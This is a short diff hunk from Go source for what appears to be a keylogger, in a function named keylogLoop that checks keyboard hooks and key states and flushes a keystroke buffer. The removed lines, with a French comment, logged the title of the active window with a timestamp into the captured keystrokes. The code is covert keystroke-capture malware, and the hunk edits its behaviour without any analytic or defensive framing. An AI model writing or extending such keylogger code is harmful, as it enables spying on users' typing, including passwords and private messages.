@@ -243,11 +243,6 @@ func keylogLoop() {
 			klFlushNow()
 			return
 		}
-		// Fenêtre active : on marque le changement.
-		if t := foregroundTitle(); t != "" && t != klLastWin {
-			klLastWin = t
-			klAppend("\n[win " + time.Now().Format("15:04:05") + "] " + t + "\n")
-		}
 
 		if !hookActive.Load() {
 			ctrl := keyHeld(0x11)
